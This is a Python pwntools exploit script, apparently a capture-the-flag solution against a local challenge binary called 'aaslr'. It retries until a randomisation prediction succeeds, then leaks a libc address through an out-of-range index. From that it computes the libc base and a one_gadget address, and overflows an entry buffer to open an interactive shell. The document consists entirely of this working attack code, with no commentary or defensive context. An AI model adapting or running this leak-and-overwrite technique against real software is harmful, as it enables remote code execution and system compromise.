from pwn import *
from time import sleep
period = 0.2
def create_entry(data):
	p.sendline("2")
	sleep(period)
	print p.recv(8000)
	p.sendline(data)
	sleep(period)
while True:
	p = process("./aaslr") #,shell=True)
	p1 = process("./gen")
	data1 = p1.recvall(timeout=1)
	#print data1
	
	p1.close()
	if "padding" in data1.lower():
		data = data1.split("-----------------------------------------\n")[1]
		
		data2 = data1.split("-----------------------------------------\n")[-1]
		print data1
		data2 = data2.strip().split("\n")
		padding = data2[0].split(":")[1]
		iterations = data2[1].split(":")[1]
		#p.interactive()
		data = data.strip()
		data = data.split("\n")
		entry_off = int(data[0],16)
		entry_off = int((entry_off % (0x10000 - 2040)))
		print "entry_off:",entry_off
		if entry_off % 8 == 0:
			entry_off=entry_off/8
			data = data[1:]
			print data
			p.sendline("4")
			sleep(period)
			for i in range(0xf):
				print i
				p.sendline(str((int(data[i],16)%6)+1))
				sleep(period)
			print data2
			print padding
			print iterations
			p.recvuntil("Welcome")
			data = p.recvuntil("Welcome")
			print data
			if "correct" in data.lower():
				for i in range(int(iterations)):
					p.sendline("1")
					sleep(period)
				open("info","w").write(padding + " " + iterations + " " + str(p.pid))
				#p.interactive()
				to_leak = -(entry_off + 790528)
				to_leak = to_leak + 511684
				create_entry("a")
				#p.interactive()
				p.sendline("3")
				sleep(period)
				p.sendline(str(to_leak))
				sleep(period)
				p.recvuntil("(max: 0):\n")
				data = p.recvline()
				for i in data:
					print i.encode('hex')
				data = data.split(". ")[1].strip()
				leak = u64(data.ljust(8,"\x00"))
				print "leak: ",hex(leak)
				libc_base = leak - 0x3e8580
				one_gadget = libc_base + 0x4f3c2
				create_entry("A"*int(padding) + p64(one_gadget))
				p.interactive()
		else:
			p.close()
			continue
	else:
		p.close()
		continue
